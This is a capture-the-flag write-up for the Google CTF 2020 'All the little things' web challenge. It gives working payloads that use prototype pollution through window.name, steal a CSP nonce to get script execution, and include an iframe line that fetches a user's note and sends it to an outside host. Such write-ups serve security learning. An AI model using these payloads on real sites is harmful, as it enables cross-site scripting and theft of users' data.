## Owner:

> CaptainFreak

#### Solved?

 - No

#### Tried:

 Did not try much TBH

#### Solutions:

With prototype pollution(unintended solution) on window.name (because it is persisted in browser even if origin changes),
we override the user.theme.cb propoerty, which is used in 
`<script src='/theme?cb=${user.theme.cb}'>`

/theme?cb="payload" reflects payload in the response

By making window.name to on our attacker site

```
{
"__proto__": {"theme":{"cb":"document.body.innerHTML=window.name.valueOf"}}
}
=====
<script>
    x = `
        <h1> Hello </h1>
        
    `
    window.name = `{"x": ${JSON.stringify(x)}, "verbose": true, "showAll": true, "keepDebug": true, "__proto__": {"theme":{"cb":"document.body.innerHTML=window.name.valueOf"}}}`;
    parent.location = 'https://littlethings.web.ctfcompetition.com/settings?__debug__';
</script>
```

and making him redirect to ctf chall,
we can write the whole window.name to DOM of victim page of chall

So we have arbitrary HTMLi on littlethings domain

but its not full XSS yet cause of CSP nonce.

We can steal and apply this nonce on our own script tag by using multiple callbacks  and then writing arbitrary code to tag and it will execute it.

```
<iframe name=x title='fetch(&#x22;/note&#x22;).then(x=>x.text()).then(x=>top.locations=&#x22;//ctf.s1r1us.ninja?html=&#x22;+btoa(encodeURIComponent(x)))' id=y srcdoc='<script><\/script>'></iframe> 
	
<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.nonce=top.document.body.lastElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nonce.valueOf ><\/script>'></iframe>

<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.document.head.lastElementChild.nonce=top.x.nonce.valueOf ><\/script>'></iframe>

<iframe srcdoc='<script src=https://littlethings.web.ctfcompetition.com/theme?cb=top.x.document.head.lastElementChild.innerHTML=top.y.title.valueOf ><\/script>'></iframe>
```

Multiple ways to exfil data though, check out:

In Fixed version,
to get arbitrary HTMLi first, we dont have prototype pollution to the rescue,The challenge name was the hint towards it.

We need to use "document.all" which is undefined but still exists!!
then again after Arbitrary xss, we use CSP bypasses to the rescue.

- https://github.com/BlackFan/ctfs/blob/master/google_ctf_2020/all_the_little_things/solution.md
- https://github.com/zoeyg/public-write-ups/blob/master/googlectf-2020/all-the-little-things.md
- https://blog.s1r1us.ninja/CTF/IuseBing
- https://ctftime.org/task/12831





